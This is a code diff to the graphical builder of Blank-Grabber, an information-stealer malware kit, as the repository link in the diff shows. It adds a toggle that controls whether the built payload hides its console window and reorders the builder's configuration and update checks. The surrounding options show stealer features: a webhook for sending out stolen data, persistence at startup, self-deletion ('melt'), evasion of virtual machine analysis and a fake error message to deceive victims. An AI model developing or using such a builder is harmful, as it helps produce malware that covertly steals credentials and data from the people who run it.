@@ -20,8 +20,8 @@ from configparser import ConfigParser
 
 class Utility:
 
-	UpdatesCheck: bool = True
-	Password: str = "blank"
+	UpdatesCheck = True
+	Password = "blank"
 
 	@staticmethod
 	def ToggleConsole(choice: bool) -> None:
@@ -74,9 +74,10 @@ class Utility:
 	@staticmethod
 	def CheckConfiguration() -> None:
 		configFile = os.path.join(os.path.dirname(__file__), "config.ini")
-		modified = False
 		password = "blank"
 		updatesCheck = True
+
+		modified = False
 
 		config = ConfigParser()
 
@@ -84,7 +85,9 @@ class Utility:
 			config.read(configFile)
 		else:
 			print("Do you regularly want to check for updates whenever you start this application? : [Y (default)/N]")
-			updatesCheck = input("--> ").strip().lower().startswith("y") or updatesCheck
+			updatesCheckPrompt = input("--> ").strip().lower()
+			if updatesCheckPrompt:
+				updatesCheck = updatesCheckPrompt.startswith("y")
 
 			print("Set a password (without whitespaces) for the archive for security reasons. (default: %r)" % password)
 			password = "_".join(input("--> ").strip().split()) or password
@@ -161,6 +164,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.iconBytes = ""
 
 		self.OutputAsExe = True
+		self.ForceConsole = False
 
 		for i in range(6):
 			self.rowconfigure(i, weight= 1)
@@ -237,6 +241,9 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		buildModeButton = ctk.CTkButton(self, text= "Output: Executable", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= lambda: self.buildModeButton_Callback(buildModeButton))
 		buildModeButton.grid(row= 3, column= 5, sticky= "ew", padx= (0, 15))
 
+		consoleModeButton = ctk.CTkButton(self, text= "Console: None", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= lambda: self.consoleModeButton_Callback(consoleModeButton))
+		consoleModeButton.grid(row= 4, column= 5, sticky= "ew", padx= (0, 15))
+
 		buildButton = ctk.CTkButton(self, text= "Build", height= 38, font= self.font, fg_color= "#1E5128", hover_color= "#4E9F3D", command= self.buildButton_Callback)
 		buildButton.grid(row= 5, column= 5, sticky= "ew", padx= (0, 15))
 	
@@ -290,6 +297,14 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 		button.configure(text= EXEMODE if self.OutputAsExe else PYMODE)
 	
+	def consoleModeButton_Callback(self, button: ctk.CTkButton) -> None:
+		CONSOLEFORCE = "Console: Force"
+		CONSOLENONE = "Console: None"
+
+		self.ForceConsole = not self.ForceConsole
+
+		button.configure(text= CONSOLEFORCE if self.ForceConsole else CONSOLENONE)
+	
 	def buildButton_Callback(self) -> None:
 		webhook = self.webhookVar.get().strip()
 
@@ -317,7 +332,8 @@ class BuilderOptionsFrame(ctk.CTkFrame):
         		"vmprotect" : self.vmProtectVar.get(),
         		"startup" : self.startupVar.get(),
         		"melt" : self.meltVar.get(),
-				"archivePassword" : Utility.Password
+				"archivePassword" : Utility.Password,
+				"hideconsole" : not self.ForceConsole
     		},
     
     		"modules" : {
@@ -498,6 +514,8 @@ class Builder(ctk.CTk):
 		options: dict = json.loads(config)
 		excludeList = []
 
+		excludeList.append("Console Mode")
+
 		if options["modules"]["fakeError"][0]:
 			excludeList.append("Fake Error")
 		
@@ -614,14 +632,14 @@ if __name__ == "__main__":
 		if "windowsapps" in sys.executable.lower():
 			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'It looks like you installed Python from Windows Store instead of using the official website https://python.org. Please disable/uninstall it and reinstall from the website.\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
 			exit(1)
+
+		Utility.CheckConfiguration()
 		
 		if Utility.CheckForUpdates():
 			response = messagebox.askyesno("Update Checker", "A new version of the application is available. It is recommended that you update it to the latest version.\n\nDo you want to update the app? (you would be directed to the official github repository)")
 			if response:
 				webbrowser.open_new_tab("https://github.com/Blank-c/Blank-Grabber")
 				exit(0)
-		
-		Utility.CheckConfiguration()
 	
 		Utility.ToggleConsole(False)
 		
